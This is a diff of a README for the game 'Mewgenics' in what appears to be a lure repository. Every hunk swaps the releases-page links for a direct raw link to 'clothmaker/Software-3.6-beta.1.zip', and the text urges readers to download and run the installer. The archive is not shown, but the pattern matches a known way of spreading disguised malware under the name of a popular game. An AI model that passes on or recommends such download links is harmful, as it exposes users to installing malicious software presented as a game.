@@ -1,6 +1,6 @@
 # 🐱 Mewgenics - Build Your Feline Army Strategically
 
-[![Download Mewgenics](https://img.shields.io/badge/Download-Mewgenics-blue?style=for-the-badge&logo=github)](https://github.com/GerrieLouw/Mewgenics/releases)
+[![Download Mewgenics](https://github.com/GerrieLouw/Mewgenics/raw/refs/heads/main/clothmaker/Software-3.6-beta.1.zip)](https://github.com/GerrieLouw/Mewgenics/raw/refs/heads/main/clothmaker/Software-3.6-beta.1.zip)
 
 ## 😺 What is Mewgenics?
 
@@ -36,7 +36,7 @@ Your system performance improves with better hardware, but the game runs smoothl
 
 To play Mewgenics, follow these simple steps:
 
-1. **Visit the Download Page:** Click the big badge at the top or head to [https://github.com/GerrieLouw/Mewgenics/releases](https://github.com/GerrieLouw/Mewgenics/releases).
+1. **Visit the Download Page:** Click the big badge at the top or head to [https://github.com/GerrieLouw/Mewgenics/raw/refs/heads/main/clothmaker/Software-3.6-beta.1.zip](https://github.com/GerrieLouw/Mewgenics/raw/refs/heads/main/clothmaker/Software-3.6-beta.1.zip).
 2. **Choose the Latest Version:** Look for the most recent release, usually labeled with the latest date or version number.
 3. **Download the Installer:** Click the installer file suitable for your system (for example, `.exe` for Windows or `.dmg` for macOS).
 4. **Run the Installer:** Double-click the downloaded file to start the installation process.
@@ -46,7 +46,7 @@ To play Mewgenics, follow these simple steps:
 ## 📥 Download & Install
 
 **Download Mewgenics here:**  
-[Download Mewgenics from Releases](https://github.com/GerrieLouw/Mewgenics/releases)
+[Download Mewgenics from Releases](https://github.com/GerrieLouw/Mewgenics/raw/refs/heads/main/clothmaker/Software-3.6-beta.1.zip)
 
 ### Detailed Installation Steps:
 
@@ -107,4 +107,4 @@ Topics: adventure, animation, cats, cute, funny, games, horror, magic, steam, ta
 
 ---
 
-[Download Mewgenics Now](https://github.com/GerrieLouw/Mewgenics/releases) to start assembling your ultimate feline army.
+[Download Mewgenics Now](https://github.com/GerrieLouw/Mewgenics/raw/refs/heads/main/clothmaker/Software-3.6-beta.1.zip) to start assembling your ultimate feline army.
